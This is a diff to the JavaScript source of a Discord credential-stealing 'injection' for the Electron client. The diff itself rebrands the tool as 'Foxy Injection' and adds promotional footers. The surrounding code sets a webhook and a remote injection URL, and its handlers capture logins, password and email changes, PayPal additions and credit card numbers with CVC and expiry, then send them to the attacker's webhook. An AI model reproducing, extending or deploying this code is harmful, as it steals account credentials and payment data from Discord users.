@@ -6,13 +6,13 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
+  webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false,
   ping_on_run: true,
-  ping_val: '@everyone',
-  embed_name: '',
-  embed_icon: ''.replace(/ /g, '%20'),
+  ping_val: '@here',
+  embed_name: 'Foxy Injection',
+  embed_icon: 'https://cdn.discordapp.com/attachments/1040380029005205605/1052894433118523402/Rocket.png'.replace(/ /g, '%20'),
   embed_color: 5639644,
   injection_url: 'https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js',
   /**
@@ -502,7 +502,6 @@ const getBilling = async (token) => {
           billing += '💳';
           break;
         case 2:
-          billing += '💳';
           break;
       }
     }
@@ -680,7 +679,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '',
+          text: '🎉・Discord Injection By KingKrex・discord.gg/FvyEuNQ7qu',
         },
       },
     ],
@@ -722,7 +721,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '',
+          text: '🎉・Discord Injection By KingKrex・discord.gg/FvyEuNQ7qu',
         },
       },
     ],
@@ -764,7 +763,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '',
+          text: '🎉・Discord Injection By KingKrex・discord.gg/FvyEuNQ7qu',
         },
       },
     ],
@@ -806,7 +805,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '',
+          text: '🎉・Discord Injection By KingKrex・discord.gg/FvyEuNQ7qu',
         },
       },
     ],
@@ -848,7 +847,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '',
+          text: '🎉・Discord Injection By KingKrex・discord.gg/FvyEuNQ7qu',
         },
       },
     ],
@@ -892,7 +891,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '',
+          text: '🎉・Discord Injection By KingKrex・discord.gg/FvyEuNQ7qu',
         },
       },
     ],
